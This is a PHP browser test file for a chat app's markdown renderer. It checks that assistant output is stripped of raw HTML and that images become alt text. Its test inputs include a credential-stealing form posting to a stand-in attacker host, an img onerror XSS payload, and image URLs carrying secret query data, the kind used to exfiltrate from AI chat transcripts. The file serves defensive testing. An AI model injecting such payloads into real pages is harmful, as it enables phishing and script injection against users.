<?php

declare(strict_types=1);

use App\Models\User;
use Illuminate\Support\Str;
use Tests\Helpers\ChatBrowser;

/**
 * The server renders assistant markdown with CommonMark's `html_input => 'strip'`.
 * window.renderMarkdown must agree: DOMPurify's default profile keeps <form>,
 * <input>, <button> and <style>, which is enough to paint a working credential
 * form inside the transcript that then disappears on reload. It must also keep
 * rendering what the server DOES emit: record chips and tables.
 */
it('strips raw HTML the server strips while keeping chips and tables', function (): void {
    $user = User::factory()->withWorkspace()->create();
    $workspace = $user->ownedWorkspaces()->first();
    $conversationId = (string) Str::uuid7();
    ChatBrowser::seedConversation($user, $workspace->getKey(), 'sanitizer', $conversationId);

    $page = ChatBrowser::logIn($user, $workspace->slug, $conversationId);

    $result = $page->script(<<<'JS'
        (() => {
            if (typeof window.renderMarkdown !== 'function') return { missing: true };

            const attack = window.renderMarkdown(
                'Hello\n\n<form action="https://attacker.example/steal" method="post">'
                + '<input name="pw"><button>Go</button></form>\n\n'
                + '<style>body{outline:9px solid lime}</style>\n\n'
                + '<img src=x onerror="window.__xssFired = 1">'
            );
            const chip = window.renderMarkdown('See [Acme Robotics](/r/company/01ABC) for details.');
            const table = window.renderMarkdown('| A | B |\n| - | - |\n| 1 | 2 |');

            return {
                missing: false,
                form: /<form/i.test(attack),
                input: /<input/i.test(attack),
                button: /<button/i.test(attack),
                style: /<style/i.test(attack),
                onerror: /onerror/i.test(attack),
                xssFired: window.__xssFired === 1,
                chipRendered: /chat-chip/.test(chip) && /href="\/r\/company\/01ABC"/.test(chip) && /Acme Robotics/.test(chip),
                tableWrapped: /chat-md-table/.test(table) && /<th/.test(table),
            };
        })()
    JS);

    expect($result['missing'])->toBeFalse()
        ->and($result['form'])->toBeFalse()
        ->and($result['input'])->toBeFalse()
        ->and($result['button'])->toBeFalse()
        ->and($result['style'])->toBeFalse()
        ->and($result['onerror'])->toBeFalse()
        ->and($result['xssFired'])->toBeFalse()
        ->and($result['chipRendered'])->toBeTrue()
        ->and($result['tableWrapped'])->toBeTrue();
});

it('shows an image as its alt text and paints no img element', function (): void {
    $user = User::factory()->withWorkspace()->create();
    $workspace = $user->ownedWorkspaces()->first();
    $conversationId = (string) Str::uuid7();
    ChatBrowser::seedConversation($user, $workspace->getKey(), 'images', $conversationId);

    $page = ChatBrowser::logIn($user, $workspace->slug, $conversationId);

    $result = $page->script(<<<'JS'
        (() => {
            if (typeof window.renderMarkdown !== 'function') return { missing: true };

            const parse = (html) => new DOMParser().parseFromString(html, 'text/html').body;
            const markdownImage = window.renderMarkdown('![logo](https://example.com/a.png?d=secret)');
            const emptyAlt = window.renderMarkdown('![](https://example.com/a.png?d=secret)');
            const formattedAlt = window.renderMarkdown('![the **big** <b onmouseover=x> logo](https://example.com/a.png)');
            const linkedImage = window.renderMarkdown('[![logo](https://example.com/a.png)](https://example.com)');
            const rawImage = window.renderMarkdown('Hi <img src=x onerror="window.__xssFired = 1"> there');
            const mixed = window.renderMarkdown('![logo](https://example.com/a.png) [site](https://example.com) [Acme](/r/company/01ABC)');

            return {
                missing: false,
                markdownText: parse(markdownImage).textContent.trim(),
                markdownHasImg: parse(markdownImage).querySelector('img') !== null,
                markdownLeaksUrl: markdownImage.includes('example.com'),
                emptyText: parse(emptyAlt).textContent.trim(),
                emptyLeaksUrl: emptyAlt.includes('example.com'),
                formattedText: parse(formattedAlt).textContent.trim(),
                formattedHasMarkup: parse(formattedAlt).querySelector('strong, b') !== null,
                linkedLinkText: parse(linkedImage).querySelector('a[href="https://example.com"]')?.textContent ?? null,
                linkedHasImg: parse(linkedImage).querySelector('img') !== null,
                rawHasImg: parse(rawImage).querySelector('img') !== null,
                rawText: parse(rawImage).textContent.trim(),
                xssFired: window.__xssFired === 1,
                mixedHasImg: parse(mixed).querySelector('img') !== null,
                mixedLink: parse(mixed).querySelector('a[href="https://example.com"]')?.textContent ?? null,
                mixedChip: parse(mixed).querySelector('a.chat-chip[href="/r/company/01ABC"]') !== null,
            };
        })()
    JS);

    expect($result['missing'])->toBeFalse()
        ->and($result['markdownText'])->toBe('logo')
        ->and($result['markdownHasImg'])->toBeFalse()
        ->and($result['markdownLeaksUrl'])->toBeFalse()
        ->and($result['emptyText'])->toBe('')
        ->and($result['emptyLeaksUrl'])->toBeFalse()
        ->and($result['formattedText'])->toBe('the big <b onmouseover=x> logo')
        ->and($result['formattedHasMarkup'])->toBeFalse()
        ->and($result['linkedLinkText'])->toBe('logo')
        ->and($result['linkedHasImg'])->toBeFalse()
        ->and($result['rawHasImg'])->toBeFalse()
        ->and($result['xssFired'])->toBeFalse()
        ->and($result['mixedHasImg'])->toBeFalse()
        ->and($result['mixedLink'])->toBe('site')
        ->and($result['mixedChip'])->toBeTrue();
});
